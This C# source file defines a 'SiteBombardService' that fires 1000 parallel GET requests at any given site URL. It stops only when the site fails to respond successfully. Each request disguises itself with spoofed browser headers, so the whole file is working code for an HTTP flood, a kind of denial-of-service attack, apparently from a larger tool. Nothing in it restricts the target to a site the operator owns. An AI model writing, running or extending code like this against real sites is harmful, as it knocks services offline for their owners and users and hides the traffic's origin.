using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Core.Abstractions;
using Microsoft.Extensions.Logging;

namespace Core;

public class SiteBombardService : ISiteBombardService
{
    private const int IterationsCount = 1000;
    private readonly IHttpClientFactory _httpClientFactory;

    public SiteBombardService(IHttpClientFactory httpClientFactory)
    {
        _httpClientFactory = httpClientFactory;
    }

    public async Task BombardAsync(string siteUrl, ILogger logger)
    {
        var cancellationTokenSource = new CancellationTokenSource();

        var list = new List<Func<CancellationToken, Task<bool>>>(IterationsCount);

        var client = _httpClientFactory.CreateClient("sites");

        for (var i = 0; i < IterationsCount; i++)
        {
            list.Add(token => MakeRequestAsync(siteUrl, logger, client, token));
        }

        await Parallel.ForEachAsync(list, cancellationTokenSource.Token, async (task, token) =>
        {
            if (cancellationTokenSource.IsCancellationRequested)
            {
                return;
            }

            var result = await task(token);

            if (!result)
            {
                cancellationTokenSource.Cancel();
            }
        });
    }
    private static async Task<bool> MakeRequestAsync(string siteUrl, ILogger logger, HttpMessageInvoker client, CancellationToken cancellationToken)
    {
        try
        {
            using var request = new HttpRequestMessage(HttpMethod.Get, new Uri(siteUrl));
            
            request.Headers.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            request.Headers.TryAddWithoutValidation("Accept-Encoding", "gzip, deflate");
            request.Headers.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
            request.Headers.TryAddWithoutValidation("Accept-Charset", "ISO-8859-1");
            
            var result = await client.SendAsync(request, cancellationToken);

            if (!result.IsSuccessStatusCode)
            {
                return false;
            }
        }
        catch (Exception e)
        {
            logger.LogError(e, $@"exception on: {siteUrl}. message: {e.Message}");
            return false;
        }

        return true;
    }
}